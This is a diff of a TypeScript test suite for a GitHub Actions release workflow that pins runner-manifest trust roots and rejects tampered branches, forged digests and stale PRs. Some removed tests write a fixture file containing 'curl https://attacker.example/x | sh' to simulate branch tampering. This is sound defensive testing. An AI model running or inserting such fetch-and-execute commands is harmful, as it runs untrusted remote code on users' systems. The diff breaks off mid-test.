+    'needs.version.outputs.advertised-version': ADVERTISED,
+    'needs.version.outputs.pr-number': '11',
+    'needs.version.outputs.resume': 'false',
+    'needs.version.outputs.head-sha': '',
+    'needs.finalize.outputs.head-sha': head,
+    [HEAD_EXPR]: head,
+    'needs.prepare.outputs.ios-sha256': p.ios.sha256,
+    'needs.prepare.outputs.ios-bytes': String(p.ios.bytes),
+    'needs.prepare.outputs.ios-tree': '',
+    'needs.prepare.outputs.android-sha256': p.android.sha256,
+    'needs.prepare.outputs.android-bytes': String(p.android.bytes),
+    'needs.prepare.outputs.android-tree': '',
+    ...overrides,
+  };
+}
+
+function stepStdout(run: JobRun, name: string): string {
+  const step = run.steps.find((s) => s.name === name);
+  assert.ok(step, `the job never ran the step "${name}"`);
+  return step.stdout;
+}
+
+function steps(workflow: Workflow, jobId: string): WorkflowStep[] {
+  return workflow.jobs[jobId].steps ?? [];
+}
+
+function stepNames(workflow: Workflow, jobId: string): string[] {
+  return steps(workflow, jobId).flatMap((s) => (s.run !== undefined && s.name ? [s.name] : []));
+}
+
+const PENDING_STEP = 'Retire armed auto-merge and detect a published candidate awaiting its merge';
+const CANDIDATE_STEP = 'Pin the generated candidate and check its delta against main';
+
+function versionPr(overrides: Partial<GhPullRequest> = {}): GhPullRequest {
+  return {
+    number: 11,
+    headRefName: 'changeset-release/main',
+    baseRefName: 'main',
+    state: 'OPEN',
+    autoMerge: null,
+    ...overrides,
+  };
+}
+
+function runVersionStep(fixture: Fixture, step: string) {
+  return runJobSteps({
+    workflow: release,
+    jobId: 'version',
+    cwd: fullClone(fixture),
+    ctx: releaseCtx(fixture),
+    env: baseEnv(fixture),
+    only: [step],
+  });
+}
+
+// --- version: retire auto-merge, resume a published candidate, pin P ---
+
+test('no open Version PR: nothing to resume and nothing to retire', () => {
+  const fixture = createFixture();
   try {
-    const mainBefore = originRef(fixture, 'main');
-    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
+    const run = runVersionStep(fixture, PENDING_STEP);
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.equal(run.outputs.pending.resume, 'false');
+    assert.equal(run.outputs.pending['advertised-version'], ADVERTISED);
+    assert.ok(!ghCalls(fixture).some((c) => c.startsWith('pr merge')));
+  } finally {
+    fixture.cleanup();
+  }
+});
 
+test('an inherited armed auto-merge is retired before the branch is touched', () => {
+  const fixture = createFixture({ prs: [versionPr({ autoMerge: 'squash' })] });
+  try {
+    const run = runVersionStep(fixture, PENDING_STEP);
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.equal(run.outputs.pending.resume, 'false');
+    assert.ok(ghCalls(fixture).includes('pr merge --disable-auto 11'));
+    assert.equal(fixture.gh.state().prs[0].autoMerge, null);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('an unpublished candidate is not resumed: main advancing regenerates it', () => {
+  const fixture = createFixture({
+    prepared: true,
+    prs: [versionPr()],
+    releases: { [TAG]: { assets: { [IOS_ZIP]: IOS_BYTES }, draft: true } },
+  });
+  try {
+    const run = runVersionStep(fixture, PENDING_STEP);
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.equal(run.outputs.pending.resume, 'false');
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a published candidate whose tag is the PR head is resumed, never regenerated', () => {
+  const fixture = createFixture({ prepared: true, prs: [versionPr()] });
+  try {
+    const head = fixture.head!;
+    const state = fixture.gh.state();
+    state.releases[TAG] = {
+      assets: {
+        [IOS_ZIP]: { uploads: 1 },
+        [ANDROID_ZIP]: { uploads: 1 },
+        'runner-manifest.json': { uploads: 1 },
+      },
+      draft: false,
+      target: head,
+    };
+    state.tags[TAG] = head;
+    writeFileSync(join(fixture.root, 'gh-state', 'state.json'), JSON.stringify(state));
+    const run = runVersionStep(fixture, PENDING_STEP);
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.equal(run.outputs.pending.resume, 'true');
+    assert.equal(run.outputs.pending['head-sha'], head);
+    assert.equal(run.outputs.pending['pr-number'], '11');
+    assert.equal(run.outputs.pending.version, VERSION);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a lookup that cannot be read is never taken as "nothing published"', () => {
+  for (const fail of ['api repos/{owner}/{repo}/git/ref', 'api repos/{owner}/{repo}/releases']) {
+    const fixture = createFixture({ prepared: true, prs: [versionPr()], tags: { [TAG]: SHA_B } });
+    try {
+      const run = runJobSteps({
+        workflow: release,
+        jobId: 'version',
+        cwd: fullClone(fixture),
+        ctx: releaseCtx(fixture),
+        env: { ...baseEnv(fixture), GH_STUB_FAIL: fail },
+        only: [PENDING_STEP],
+      });
+      assert.equal(run.ok, false, fail);
+      assert.match(run.failed!.stderr, /refusing to guess/);
+      assert.equal(run.outputs.pending?.resume, undefined);
+    } finally {
+      fixture.cleanup();
+    }
+  }
+});
+
+test('the generated candidate is pinned as one commit on top of main with only generated paths', () => {
+  const fixture = createFixture();
+  try {
+    const run = runVersionStep(fixture, CANDIDATE_STEP);
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.equal(run.outputs.candidate.sha, fixture.candidate);
+    assert.equal(run.outputs.candidate.version, VERSION);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a candidate carrying a path the generator never writes is refused', () => {
+  const fixture = createFixture({
+    candidateExtraFiles: { 'packages/rn-dev-agent-core/src/index.ts': 'export {};\n' },
+  });
+  try {
+    const run = runVersionStep(fixture, CANDIDATE_STEP);
+    assert.equal(run.ok, false);
+    assert.match(
+      run.failed!.stderr,
+      /changes paths a version bump never generates: packages\/rn-dev-agent-core\/src\/index\.ts/,
+    );
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a candidate that is not one commit on top of the pushed main is refused', () => {
+  const fixture = createFixture();
+  try {
+    advanceMain(fixture);
+    const run = runJobSteps({
+      workflow: release,
+      jobId: 'version',
+      cwd: fullClone(fixture),
+      ctx: releaseCtx(fixture, { 'github.sha': originRef(fixture, 'refs/heads/main')! }),
+      env: baseEnv(fixture),
+      only: [CANDIDATE_STEP],
+    });
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /not one generated commit on top of main/);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a candidate whose native runner sources differ from main is refused even on a generated path', () => {
+  const fixture = createFixture({
+    candidateExtraFiles: { 'packages/rn-android-runner/package.json': '{"version": "0.2.0"}\n' },
+  });
+  try {
+    const run = runVersionStep(fixture, CANDIDATE_STEP);
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /native inputs under packages\/rn-android-runner differ/);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+// --- finalize: trust root from the retained bytes, committed as H ---
+
+function runFinalize(
+  fixture: Fixture,
+  { ctx = {}, tamper }: { ctx?: Record<string, string>; tamper?: () => void } = {},
+) {
+  const dir = checkout(fixture, fixture.candidate);
+  handoff(dir);
+  tamper?.();
+  return {
+    dir,
+    run: runJobSteps({
+      workflow: release,
+      jobId: 'finalize',
+      cwd: dir,
+      ctx: releaseCtx(fixture, ctx),
+      env: baseEnv(fixture),
+    }),
+  };
+}
+
+test('finalize generates root + host copies from the retained bytes and pins H on the version branch', () => {
+  const fixture = createFixture();
+  try {
+    const { run } = runFinalize(fixture);
+    assert.ok(run.ok, run.failed?.stderr);
+    const head = run.outputs.commit.sha;
+    assert.match(head, /^[0-9a-f]{40}$/);
+    assert.equal(originRef(fixture, 'refs/heads/changeset-release/main'), head);
     assert.equal(
-      originRef(fixture, 'main'),
-      mainBefore,
-      'main must be reached only through the PR',
+      git(fixture.root, '--git-dir', fixture.origin, 'rev-parse', `${head}^`).trim(),
+      fixture.candidate,
     );
-    const head = originRef(fixture, BRANCH);
-    assert.ok(head, 'the manifest branch must exist on the remote');
-
-    const log = git(
+    for (const path of MANIFEST_PATHS) {
+      assert.equal(
+        git(fixture.root, '--git-dir', fixture.origin, 'show', `${head}:${path}`),
+        manifestFor(),
+      );
+    }
+    const changed = git(
       fixture.root,
       '--git-dir',
       fixture.origin,
-      'log',
-      '--format=%s',
-      `${mainBefore}..${head}`,
-    )
-      .trim()
-      .split('\n');
-    assert.deepEqual(log, [`chore(release): runner-manifest for v${VERSION}`]);
-    assert.doesNotMatch(
-      log[0],
-      /\[\s*skip[ -]ci\s*\]/i,
-      'a CI-skipped commit can never produce "Build & Test"',
-    );
-
-    const touched = git(
-      fixture.root,
-      '--git-dir',
-      fixture.origin,
-      'show',
+      'diff',
       '--name-only',
-      '--format=',
+      fixture.candidate,
       head,
     )
       .trim()
       .split('\n')
       .sort();
-    assert.deepEqual(touched, [
-      'packages/claude-plugin/runner-manifest.json',
-      'packages/codex-plugin/runner-manifest.json',
-      'runner-manifest.json',
-    ]);
+    assert.deepEqual(changed, [...MANIFEST_PATHS].sort());
+    assert.equal(originRef(fixture, 'refs/heads/main'), fixture.base, 'main is never written');
+  } finally {
+    fixture.cleanup();
+  }
+});
 
-    const committed = git(
+test('a retained zip that does not match the producer identity stops finalize before anything is generated', () => {
+  const fixture = createFixture();
+  try {
+    const { run } = runFinalize(fixture, {
+      ctx: { 'needs.prepare.outputs.ios-sha256': sha256('substituted') },
+    });
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /retained sha256 .* != producer/);
+    assert.equal(originRef(fixture, 'refs/heads/changeset-release/main'), fixture.candidate);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a retained zip of the wrong length is refused', () => {
+  const fixture = createFixture();
+  try {
+    const { run } = runFinalize(fixture, {
+      ctx: { 'needs.prepare.outputs.android-bytes': String(ANDROID_BYTES.length + 1) },
+    });
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /retained length .* != producer/);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a missing retained zip is a partial handoff and refuses', () => {
+  const fixture = createFixture();
+  try {
+    const dir = checkout(fixture, fixture.candidate);
+    write(dir, `handoff/${IOS_ZIP}`, IOS_BYTES);
+    const run = runJobSteps({
+      workflow: release,
+      jobId: 'finalize',
+      cwd: dir,
+      ctx: releaseCtx(fixture),
+      env: baseEnv(fixture),
+    });
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /retained rn-android-runner-0\.76\.7\.zip is missing/);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('finalize refuses to land on a version branch that moved away from its candidate', () => {
+  const fixture = createFixture();
+  try {
+    const dir = checkout(fixture, fixture.candidate);
+    handoff(dir);
+    // The branch is regenerated underneath this run (main advanced).
+    const other = fullClone(fixture);
+    git(other, 'checkout', '--quiet', 'changeset-release/main');
+    write(other, 'packages/claude-plugin/CHANGELOG.md', 'regenerated\n');
+    git(other, 'commit', '--quiet', '-am', 'chore(release): version packages');
+    git(other, 'push', '--quiet', 'origin', 'changeset-release/main');
+    const moved = originRef(fixture, 'refs/heads/changeset-release/main');
+    const run = runJobSteps({
+      workflow: release,
+      jobId: 'finalize',
+      cwd: dir,
+      ctx: releaseCtx(fixture),
+      env: baseEnv(fixture),
+    });
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /stale info|rejected/);
+    assert.equal(originRef(fixture, 'refs/heads/changeset-release/main'), moved);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+// --- validate: the prepared trust root against the handoff and native inputs ---
+
+const PREPARED_STEP = 'Prepared trust root matches the retained bytes and the native inputs';
+
+function treeCtx(fixture: Fixture, ref: string): Record<string, string> {
+  return {
+    'needs.prepare.outputs.ios-tree': git(
       fixture.root,
       '--git-dir',
       fixture.origin,
-      'show',
-      `${head}:runner-manifest.json`,
-    );
-    const manifest = JSON.parse(committed);
-    assert.equal(manifest.version, VERSION);
-    assert.deepEqual(manifest.assets.ios, [
-      { name: IOS_ZIP, sha256: sha256(IOS_BYTES), bytes: IOS_BYTES.length },
-    ]);
-    assert.deepEqual(manifest.assets.android, [
-      { name: ANDROID_ZIP, sha256: sha256(ANDROID_BYTES), bytes: ANDROID_BYTES.length },
-    ]);
-    for (const copy of [
-      'packages/codex-plugin/runner-manifest.json',
-      'packages/claude-plugin/runner-manifest.json',
-    ]) {
-      assert.equal(
-        git(fixture.root, '--git-dir', fixture.origin, 'show', `${head}:${copy}`),
-        committed,
-        `${copy} must carry the same trust root as the root manifest`,
-      );
-    }
-
-    // The release asset and the committed manifest are the same bytes, which is
-    // what lets detect recognise the trust root as current on the next sweep.
-    assert.equal(
-      readFileSync(fixture.gh.assetPath(TAG, 'runner-manifest.json'), 'utf8'),
-      committed,
-    );
-
-    const state = fixture.gh.state();
-    assert.equal(state.prs.length, 1, 'exactly one manifest PR');
-    assert.deepEqual(
-      { head: state.prs[0].headRefName, base: state.prs[0].baseRefName, state: state.prs[0].state },
-      { head: BRANCH, base: 'main', state: 'OPEN' },
-    );
-    assert.equal(
-      state.prs[0].autoMerge,
-      'squash',
-      'the PR must be armed to merge once checks pass',
-    );
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a just-created PR the list API cannot see yet is still armed for auto-merge', () => {
-  // The pre-fix job re-queried `gh pr list --head` after creating the PR and
-  // aborted when the lookup came back empty, stranding an armed-less PR — and
-  // the trust root — until the next sweep.
-  const fixture = createFixture({ releaseAssets: completeRelease() });
-  try {
-    const run = runPublish(fixture, {
-      workdir: checkout(fixture, 'run1'),
-      env: { GH_STUB_LIST_HEAD_BLIND: '1' },
-    });
-    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
-    const state = fixture.gh.state();
-    assert.equal(state.prs.length, 1);
-    assert.equal(state.prs[0].autoMerge, 'squash');
-    assert.equal(
-      ghCalls(fixture).filter((c) => c.startsWith('pr list --head')).length,
-      1,
-      'the PR number must come from `gh pr create`, not a second lookup',
-    );
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('rerunning the publish job converges: no second commit, no second PR', () => {
-  const fixture = createFixture({ releaseAssets: completeRelease() });
-  try {
-    const first = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(first.ok, `first run failed at ${first.failed?.name}: ${first.failed?.stderr}`);
-    const headAfterFirst = originRef(fixture, BRANCH);
-
-    const second = runPublish(fixture, { workdir: checkout(fixture, 'run2') });
-    assert.ok(second.ok, `rerun failed at ${second.failed?.name}: ${second.failed?.stderr}`);
-
-    assert.equal(originRef(fixture, BRANCH), headAfterFirst, 'a rerun must not add a commit');
-    const state = fixture.gh.state();
-    assert.equal(state.prs.length, 1, 'a rerun must reuse the open PR, never stack a duplicate');
-    assert.equal(state.prs[0].autoMerge, 'squash');
-    assert.equal(
-      ghCalls(fixture).filter((c) => c.startsWith('pr create')).length,
-      1,
-      'exactly one creation across both runs',
-    );
-    // Re-uploading the manifest asset must be tolerated, not a hard failure.
-    assert.equal(state.releases[TAG].assets['runner-manifest.json'].uploads, 2);
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('main advancing while the manifest PR waits leaves its head untouched', () => {
-  // A GITHUB_TOKEN PR's CI parks at action_required per head SHA, so re-pushing
-  // the branch discards the maintainer's "Approve and run". An unrelated commit
-  // on main must therefore not move the head at all.
-  const fixture = createFixture({ releaseAssets: completeRelease() });
-  try {
-    const first = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(first.ok, `first run failed at ${first.failed?.name}: ${first.failed?.stderr}`);
-    const head = originRef(fixture, BRANCH);
-    const pr = fixture.gh.state().prs[0].number;
-
-    advanceMain(fixture, 'docs/unrelated.md', 'work that has nothing to do with runners\n');
-    advanceMain(fixture, 'README.md', 'main moved again\n');
-
-    const second = runPublish(fixture, { workdir: checkout(fixture, 'run2') });
-    assert.ok(second.ok, `rerun failed at ${second.failed?.name}: ${second.failed?.stderr}`);
-    assert.match(stepStdout(second, BRANCH_STEP), /reusing/, 'the head must be kept, not rebuilt');
-    assert.equal(second.outputs.commit.pushed, 'false', 'nothing changed — nothing to push');
-    assert.equal(originRef(fixture, BRANCH), head, 'the approved head SHA must survive');
-    assert.deepEqual(
-      fixture.gh.state().prs.map((p) => p.number),
-      [pr],
-      'the same PR must be reused',
-    );
-    assert.equal(fixture.gh.state().prs[0].autoMerge, 'squash');
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a branch this workflow already extended keeps being reused, never churned', () => {
-  // The workflow makes a second commit whenever a rebuild changes the digests.
-  // That must not turn its own branch into a foreign one: the head would then be
-  // rewritten on every advance of main, discarding the maintainer's approval
-  // each time and never letting the required check accumulate.
-  const fixture = createFixture({ releaseAssets: completeRelease() });
-  try {
-    const first = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(first.ok, `first run failed at ${first.failed?.name}: ${first.failed?.stderr}`);
-
-    writeFileSync(fixture.gh.assetPath(TAG, IOS_ZIP), 'rebuilt-ios-runner-zip-bytes');
-    const second = runPublish(fixture, {
-      workdir: checkout(fixture, 'run2'),
-      ctx: { 'needs.detect.outputs.build': 'true' },
-    });
-    assert.ok(second.ok, `rerun failed at ${second.failed?.name}: ${second.failed?.stderr}`);
-    assert.equal(second.outputs.commit.pushed, 'true', 'rebuilt digests must be re-committed');
-    const twoCommits = originRef(fixture, BRANCH);
-    assert.equal(
-      git(
-        fixture.root,
-        '--git-dir',
-        fixture.origin,
-        'rev-list',
-        '--count',
-        String(twoCommits),
-      ).trim(),
-      String(
-        Number(
-          git(
-            fixture.root,
-            '--git-dir',
-            fixture.origin,
-            'rev-list',
-            '--count',
-            String(originRef(fixture, 'main')),
-          ).trim(),
-        ) + 2,
-      ),
-      'the branch now carries two commits of this workflow',
-    );
-
-    advanceMain(fixture, 'docs/unrelated.md', 'more unrelated work\n');
-    const third = runPublish(fixture, { workdir: checkout(fixture, 'run3') });
-    assert.ok(third.ok, `third run failed at ${third.failed?.name}: ${third.failed?.stderr}`);
-    assert.match(stepStdout(third, BRANCH_STEP), /reusing/, 'two commits is not foreign');
-    assert.equal(third.outputs.commit.pushed, 'false');
-    assert.equal(originRef(fixture, BRANCH), twoCommits, 'the approved head must survive');
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a fork PR whose branch merely looks like a manifest branch is left alone', () => {
-  // Head-ref names on fork PRs are chosen by the contributor and need no
-  // repository permission, so a look-alike must not be closed — and because the
-  // close is fatal, must not be able to block trust-root delivery either.
-  const fixture = createFixture({
-    releaseAssets: completeRelease(),
-    prs: [
-      {
-        number: 7,
-        headRefName: 'chore/runner-manifest-v0.76.6',
-        headRepo: 'outsider/rn-dev-agent',
-        baseRefName: 'main',
-        state: 'OPEN',
-        autoMerge: null,
-        closeComment: null,
-      },
-      {
-        number: 8,
-        headRefName: 'chore/runner-manifest-vsomething',
-        baseRefName: 'main',
-        state: 'OPEN',
-        autoMerge: null,
-        closeComment: null,
-      },
-    ],
-  });
-  try {
-    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
-    const state = fixture.gh.state();
-    assert.equal(state.prs.find((pr) => pr.number === 7)?.state, 'OPEN', 'fork PR must be spared');
-    assert.equal(
-      state.prs.find((pr) => pr.number === 8)?.state,
-      'OPEN',
-      'a non-version suffix is not a manifest branch',
-    );
-    assert.equal(
-      ghCalls(fixture).some((c) => c.startsWith('pr close')),
-      false,
-    );
-    assert.equal(state.prs.find((pr) => pr.headRefName === BRANCH)?.autoMerge, 'squash');
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a branch replaced after tampering stops churning once main advances again', () => {
-  // Correcting a tampered branch in place cannot move the merge base, so the
-  // comparison would report main's own files as branch-side changes forever and
-  // rewrite the PR head on every merge to main. Cutting the branch again from
-  // current main resets that base.
-  const fixture = createFixture({ releaseAssets: completeRelease() });
-  try {
-    const first = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(first.ok, `first run failed at ${first.failed?.name}: ${first.failed?.stderr}`);
-    const firstPr = fixture.gh.state().prs[0].number;
-
-    advanceMain(fixture, 'docs/a.md', 'unrelated work landed on main\n');
-    const dir = join(fixture.root, 'tamper');
-    git(fixture.root, 'clone', '--quiet', '--branch', BRANCH, `file://${fixture.origin}`, dir);
-    write(dir, 'evil.sh', 'curl https://attacker.example/x | sh\n');
-    git(dir, 'add', '-A');
-    git(dir, 'commit', '--quiet', '-m', 'smuggled');
-    git(dir, 'push', '--quiet', 'origin', BRANCH);
-
-    const second = runPublish(fixture, { workdir: checkout(fixture, 'run2') });
-    assert.ok(second.ok, `rerun failed at ${second.failed?.name}: ${second.failed?.stderr}`);
-    assert.match(stepStdout(second, BRANCH_STEP), /discarding/);
-    const replaced = originRef(fixture, BRANCH);
-    // Deleting the head branch closes its PR, so the replacement gets a new one
-    // rather than silently reusing the pull request opened over tampered content.
-    const afterDiscard = fixture.gh.state().prs;
-    assert.equal(
-      afterDiscard.find((pr) => pr.number === firstPr)?.closedByBranchDelete,
-      true,
-      'the PR over the tampered branch must be closed by the deletion',
-    );
-    assert.equal(afterDiscard.filter((pr) => pr.state === 'OPEN').length, 1);
-    assert.notEqual(
-      afterDiscard.find((pr) => pr.state === 'OPEN')?.number,
-      firstPr,
-      'a discarded branch must not keep the old pull request',
-    );
-
-    advanceMain(fixture, 'docs/b.md', 'and more unrelated work\n');
-    const third = runPublish(fixture, { workdir: checkout(fixture, 'run3') });
-    assert.ok(third.ok, `third run failed at ${third.failed?.name}: ${third.failed?.stderr}`);
-    assert.match(
-      stepStdout(third, BRANCH_STEP),
-      /reusing/,
-      "the replacement must read as clean, not as carrying main's own files",
-    );
-    assert.equal(third.outputs.commit.pushed, 'false');
-    assert.equal(originRef(fixture, BRANCH), replaced, 'the head must stop being rewritten');
-
-    const fourth = runPublish(fixture, { workdir: checkout(fixture, 'run4') });
-    assert.ok(fourth.ok, `fourth run failed at ${fourth.failed?.name}: ${fourth.failed?.stderr}`);
-    assert.equal(originRef(fixture, BRANCH), replaced);
-    assert.equal(
-      fixture.gh.state().prs.filter((pr) => pr.state === 'OPEN').length,
-      1,
-      'exactly one manifest PR stays open through all of it',
-    );
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a manifest rewritten on the branch is recomputed, not carried into the PR', () => {
-  // The reuse allowlist admits any diff confined to the three manifest paths, so
-  // it cannot tell this workflow's commit from one anybody with `contents: write`
-  // pushed onto the same unprotected branch. A manifest-only rewrite therefore
-  // survives the allowlist — and must not survive the manifest step, or attacker
-  // digests would reach the release asset and an auto-merging trust-root PR.
-  const forged = JSON.stringify(
-    {
-      version: VERSION,
-      assets: {
-        ios: [{ name: IOS_ZIP, sha256: 'e'.repeat(64), bytes: 1 }],
-        android: [{ name: ANDROID_ZIP, sha256: 'e'.repeat(64), bytes: 2 }],
-      },
-    },
-    null,
-    2,
-  );
-  const fixture = createFixture({
-    repoManifest: currentManifest(),
-    releaseAssets: completeRelease(),
-    manifestBranchFiles: {
-      'runner-manifest.json': forged,
-      'packages/codex-plugin/runner-manifest.json': forged,
-      'packages/claude-plugin/runner-manifest.json': forged,
-    },
-  });
-  try {
-    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
-    assert.equal(
-      run.outputs.branch.existed,
-      'true',
-      'a manifest-only diff is reused, not discarded',
-    );
-
-    const head = originRef(fixture, BRANCH);
-    const delivered = git(
+      'rev-parse',
+      `${ref}:packages/rn-fast-runner`,
+    ).trim(),
+    'needs.prepare.outputs.android-tree': git(
       fixture.root,
       '--git-dir',
       fixture.origin,
-      'show',
-      `${head}:runner-manifest.json`,
-    );
-    assert.equal(delivered, currentManifest(), 'the PR must describe the zips the release serves');
-    assert.equal(
-      readFileSync(fixture.gh.assetPath(TAG, 'runner-manifest.json'), 'utf8'),
-      currentManifest(),
-      'the forged digests must not reach the release asset either',
-    );
-  } finally {
-    fixture.cleanup();
-  }
-});
+      'rev-parse',
+      `${ref}:packages/rn-android-runner`,
+    ).trim(),
+  };
+}
 
-test('content pushed onto the manifest branch by anyone else never reaches the PR', () => {
-  // The branch is workflow-owned and unprotected: the delivery path must rebuild
-  // its content from main rather than carry whatever the branch happens to hold
-  // into a PR a maintainer approves as a routine bot manifest update.
-  const fixture = createFixture({
-    releaseAssets: completeRelease(),
-    manifestBranchFiles: {
-      'evil.sh': 'curl https://attacker.example/x | sh\n',
-      'README.md': 'tampered repository content\n',
-    },
-  });
-  try {
-    const tampered = originRef(fixture, BRANCH);
-    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
-    assert.equal(run.outputs.branch.existed, 'false', 'the tampered branch must be discarded');
-
-    const head = originRef(fixture, BRANCH);
-    const main = originRef(fixture, 'main');
-    const show = (ref: string, path: string) =>
-      git(fixture.root, '--git-dir', fixture.origin, 'show', `${ref}:${path}`);
-
-    assert.deepEqual(
-      git(
-        fixture.root,
-        '--git-dir',
-        fixture.origin,
-        'diff',
-        '--name-only',
-        String(main),
-        String(head),
-      )
-        .trim()
-        .split('\n')
-        .sort(),
-      [
-        'packages/claude-plugin/runner-manifest.json',
-        'packages/codex-plugin/runner-manifest.json',
-        'runner-manifest.json',
-      ],
-      'the PR may differ from main in the trust root and nothing else',
-    );
-    assert.equal(show(String(head), 'README.md'), show(String(main), 'README.md'));
-    assert.throws(() => show(String(head), 'evil.sh'), 'the smuggled file must be gone');
-    // The replacement is cut from main, so the tampered commit is not in its
-    // history at all — and it got there by deleting the branch and pushing a new
-    // one, never by force-updating a ref.
-    assert.throws(
-      () =>
-        git(
-          fixture.root,
-          '--git-dir',
-          fixture.origin,
-          'merge-base',
-          '--is-ancestor',
-          String(tampered),
-          String(head),
-        ),
-      'the tampered commit must not survive in the branch history',
-    );
-    assert.equal(
-      git(fixture.root, '--git-dir', fixture.origin, 'rev-parse', `${String(head)}^`).trim(),
-      String(main),
-      'the replacement must be parented on current main, resetting the merge base',
-    );
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a rerun after a rebuild re-commits the new digests onto the same branch', () => {
-  const fixture = createFixture({ releaseAssets: completeRelease() });
-  try {
-    const first = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(first.ok, `first run failed at ${first.failed?.name}: ${first.failed?.stderr}`);
-    const headAfterFirst = originRef(fixture, BRANCH);
-
-    // The runner zips were rebuilt, so the digests the manifest must carry change.
-    writeFileSync(fixture.gh.assetPath(TAG, IOS_ZIP), 'rebuilt-ios-runner-zip-bytes');
-    const second = runPublish(fixture, {
-      workdir: checkout(fixture, 'run2'),
-      ctx: { 'needs.detect.outputs.build': 'true' },
-    });
-    assert.ok(second.ok, `rerun failed at ${second.failed?.name}: ${second.failed?.stderr}`);
-
-    const head = originRef(fixture, BRANCH);
-    assert.notEqual(head, headAfterFirst, 'rebuilt digests must be re-committed');
-    assert.equal(
-      JSON.parse(
-        git(fixture.root, '--git-dir', fixture.origin, 'show', `${head}:runner-manifest.json`),
-      ).assets.ios[0].sha256,
-      sha256('rebuilt-ios-runner-zip-bytes'),
-    );
-    assert.equal(fixture.gh.state().prs.length, 1, 'still the same PR');
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a manifest PR from an earlier version is closed before this one is armed', () => {
-  const superseded = 'chore/runner-manifest-v0.76.6';
-  // Enough unrelated open PRs that the superseded one falls past the first API
-  // page: an unpaged sweep would miss it, and it must still be found and retired.
-  const noise: GhPullRequest[] = Array.from({ length: 120 }, (_unused, i) => ({
-    number: 100 + i,
-    headRefName: `feature/unrelated-${i}`,
-    baseRefName: 'main',
-    state: 'OPEN',
-    autoMerge: null,
-    closeComment: null,
-  }));
-  const fixture = createFixture({
-    releaseAssets: completeRelease(),
-    supersededBranches: [superseded],
-    prs: [
-      ...noise,
-      {
-        number: 7,
-        headRefName: superseded,
-        baseRefName: 'main',
-        state: 'OPEN',
-        autoMerge: 'squash',
-        closeComment: null,
-      },
-    ],
-  });
-  try {
-    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
-
-    const state = fixture.gh.state();
-    const stale = state.prs.find((pr) => pr.number === 7);
-    assert.equal(stale?.state, 'CLOSED', 'an armed superseded PR would land after this one');
-    assert.match(String(stale?.closeComment), new RegExp(`Superseded .*v${VERSION}`));
-    assert.equal(originRef(fixture, superseded), null, 'its branch must be deleted too');
-
-    const current = state.prs.find((pr) => pr.headRefName === BRANCH);
-    assert.equal(current?.state, 'OPEN', 'the sweep must never close the PR it just opened');
-    assert.equal(current?.autoMerge, 'squash');
-
-    const calls = ghCalls(fixture);
-    const closeAt = calls.findIndex((c) => c.startsWith('pr close'));
-    const mergeAt = calls.findIndex((c) => c.startsWith('pr merge'));
-    assert.ok(closeAt !== -1 && mergeAt !== -1);
-    assert.ok(closeAt < mergeAt, 'the superseded PR must be retired BEFORE this one is armed');
-    assert.equal(calls.filter((c) => c.startsWith('pr close')).length, 1);
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a failed pull-request listing aborts instead of sweeping nothing', () => {
-  // The sweep is a pipeline, and the runner's default shell has no pipefail, so
-  // a failing listing would otherwise yield an empty STALE, close nothing, and
-  // still arm this PR — leaving an armed PR from an earlier version free to land
-  // afterwards and restore a stale trust root.
-  const superseded = 'chore/runner-manifest-v0.76.6';
-  const fixture = createFixture({
-    releaseAssets: completeRelease(),
-    supersededBranches: [superseded],
-    prs: [
-      {
-        number: 7,
-        headRefName: superseded,
-        baseRefName: 'main',
-        state: 'OPEN',
-        autoMerge: 'squash',
-        closeComment: null,
-      },
-    ],
-  });
-  try {
-    const run = runPublish(fixture, {
